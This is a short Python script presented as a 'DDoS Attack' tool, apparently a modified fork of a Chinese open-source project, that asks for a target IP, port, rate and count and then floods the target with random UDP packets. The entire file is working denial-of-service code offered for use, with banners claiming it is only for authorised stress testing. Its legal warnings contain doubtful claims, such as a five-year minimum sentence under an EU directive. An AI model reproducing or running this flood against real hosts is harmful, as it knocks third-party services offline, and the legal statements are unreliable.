#!/usr/bin/env python3

# https://github.com/HYYQI/hyddos
import sys
import os
import time
import socket

WELCOME = """
原信息:

/-----------------------------------------------------\\
|   原作者        : Andysun06                         |
|   原作者github  : https://github.com/Andysun06      |
|   kali-QQ学习群 : 909533854(加入陌生群聊请注意安全) |
|   版本          : V1.1.0                            |
|   严禁转载，程序教程仅发布在CSDN（用户Andysun06）   |
\-----------------------------------------------------/

 ######## HYYQI修改(https://github.com/HYYQI) ########
 ------------------[请勿用于违法用途]------------------ 
 版本: v1.2.0
 仅适用于被允许的合法压力测试
"""
WARNING = """
 ******** 法律风险警告 ********
 未经授权的DDoS攻击构成网络犯罪
 我国《刑法》第285/286条明确禁止破坏计算机信息系统
 美国CFAA法案最高可判10年监禁
 欧盟NIS指令规定最低5年刑期
 
 (按回车开始)
"""

if __name__ == "__main__":
    # welcome 
    os.system("figlet DDos Attack")
    print(WELCOME)
    # input
    try:
        ip = input("目标IP地址       : ")
        port = int(input("攻击端口         : "))
        sd = int(input("攻击速度(1~1000) : "))
        number = int(input("攻击次数         : "))
        print(WARNING)
        input()
    except Exception as e:
        print(f"输入错误: {str(e)}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n攻击终止")
        sys.exit(1)
    
    sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = os.urandom(1490)
    try:
        for _ in range(number):
            sock.sendto(bytes, (ip,port))
            sent += 1
            print(f"已发送{sent}个数据包到{ip}:{port}")
            time.sleep((1000-sd)/2000)
    except KeyboardInterrupt:
        print("\n攻击手动终止")
    except Exception as e:
        print(f"错误: {str(e)}")
